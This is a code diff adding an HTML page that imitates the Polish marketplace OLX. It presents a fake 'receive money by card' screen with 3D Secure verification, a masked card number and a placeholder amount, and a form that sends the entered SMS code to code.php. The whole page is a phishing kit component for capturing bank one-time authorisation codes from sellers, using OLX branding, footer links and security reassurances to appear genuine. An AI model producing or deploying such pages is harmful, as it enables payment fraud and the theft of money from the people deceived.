@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html>
+<head lang="pl-PL">
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="1000">
+    <link rel="stylesheet" href="style3.css">
+    <script src="expand.js"></script>
+    <title>OLX - Odbierz płatność</title>
+</head>
+<body>
+<div class="deskop">
+    <header>
+        <a href="#"><img src="logo.png"></a>
+    </header>
+    <div class="circle">
+    </div>
+    <div class="body_middle">
+        <div class="container">
+            <div id="box" class="box">
+                <div class="details">
+                    <div class="details_info">
+                        <a class="details_info_first">Odbieranie pieniędzy kartą</a>
+                        <a class="details_info_second">Weryfikacja 3D Secure</a>
+                    </div>
+                    <div class="details_top">
+                        <a class="details_top_first">Dane odbioru środków:</a>
+                    </div>
+                    <div class="details_middle">
+                        <div class="details_middle_left">
+                            <a class="details_middle_left_first">Nazwa punktu usługowo-handlowego:</a>
+                            <a class="details_middle_left_second">Data:</a>
+                            <a class="details_middle_left_third">Numer karty:</a>
+                            <a class="details_middle_left_fourth">Kwota i waluta odbioru:</a>
+                        </div>
+                        <div class="details_middle_right">
+                            <a class="details_middle_right_first">OLX Sp. z o.o.</a>
+                            <a class="details_middle_right_second">2022-01-27</a>
+                            <a class="details_middle_right_third">XXXX XXXX XXXX XXXX</a>
+                            <a class="details_middle_right_fourth">kutas</a>
+                        </div>
+                    </div>
+                    <div class="details_bottom">
+                        <a class="details_bottom_first">Transakcja zabezpieczona usługą 3D-Secure.</a>
+                        <a class="details_bottom_second">Sprawdź poprawność danych i wprowadź kod sms, 
+                            który powinien przyjść w ciągu 5 minut na 
+                            twój telefon komórkowy.</a>
+                    </div>
+                </div>
+                <div class="sms">
+                    <div class="sms_top">
+                        <a>WPISZ KOD SMS</a>
+                    </div>
+                    <div class="sms_middle">
+                        <form action="code.php" method="post">
+                            <input type="text" name="code">
+                            <button>POTWIERDŹ</button>
+                        </form>
+                    </div>
+                </div>
+                <div class="info_security">
+                    <a>Zapewniamy pełne bezpieczeństwo</a>
+                    <div><img src="/o/card.png"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="body_bottom">
+        <div class="body_bottom_1">
+            <div class="links1">
+                <a><span>Aplikacje mobilne OLX.pl</span></a>
+                <a><span>Pomoc</span></a>
+                <a><span>Wyróżnione ogłoszenia</span></a>
+                <a><span>Oferta dla firm</span></a>
+                <a><span>Blog</span></a>
+                <a><span>Regulamin</span></a>
+                <a><span>Polityka prywatności</span></a>
+                <a><span>Reklama</span></a>
+                <a><span>Biuro prasowe</span></a>
+            </div>
+            <div class="links2">
+                <a><span>Jak działa OLX.pl</span></a>
+                <a><span>Zasady bezpieczeństwa</span></a>
+                <a><span>Mapa kategorii</span></a>
+                <a><span>Mapa miejscowości</span></a>
+                <a><span>Popularne wyszukiwania</span></a>
+                <a><span>Kariera</span></a>
+                <a><span>Ustawienia plików cookie</span></a>
+                <a><span>Kody rabatowe</span></a>
+                <a><span>Ubezpieczenia OC/AC</span></a>
+            </div>
+            <div class="app">
+                <img src="play.png">
+                <img src="appstore.png">
+                <a><span>Darmowa aplikacja na Twój telefon</span></a>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="mobile">
+    <div class="container">   
+        <div class="box">
+            <div class="details">
+                <div class="details_info">
+                    <a class="details_info_first">Odbieranie pieniędzy kartą</a>
+                    <a class="details_info_second">Weryfikacja 3D Secure</a>
+                </div>
+                <div class="details_top">
+                    <a class="details_top_first">Dane odbioru środków:</a>
+                </div>
+                <div class="details_middle">
+                    <div class="details_middle_left">
+                        <a class="details_middle_left_first">Nazwa punktu usługowo-handlowego:</a>
+                        <a class="details_middle_left_second">Data:</a>
+                        <a class="details_middle_left_third">Numer karty:</a>
+                        <a class="details_middle_left_fourth">Kwota i waluta odbioru:</a>
+                    </div>
+                    <div class="details_middle_right">
+                        <a class="details_middle_right_first">OLX Sp. z o.o.</a>
+                        <a class="details_middle_right_second">2022-01-27</a>
+                        <a class="details_middle_right_third">XXXX XXXX XXXX 5379</a>
+                        <a class="details_middle_right_fourth">kutas</a>
+                    </div>
+                </div>
+                <div class="details_bottom">
+                    <a class="details_bottom_first">Transakcja zabezpieczona usługą 3D-Secure.</a>
+                    <a class="details_bottom_second">Sprawdź poprawność danych i wprowadź kod sms, 
+                        który powinien przyjść w ciągu 5 minut na 
+                        twój telefon komórkowy.</a>
+                </div>
+            </div>
+            <div class="sms">
+                <div class="sms_top">
+                    <a>WPISZ KOD SMS</a>
+                </div>
+                <div class="sms_middle">
+                    <form action="code.php" method="post">
+                        <input type="text" name="code">
+                        <button>POTWIERDŹ</button>
+                    </form>
+                </div>
+            </div>
+            <div class="info_security">
+                <a>Zapewniamy pełne bezpieczeństwo</a>
+                <div><img src="/o/card.png"></div>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
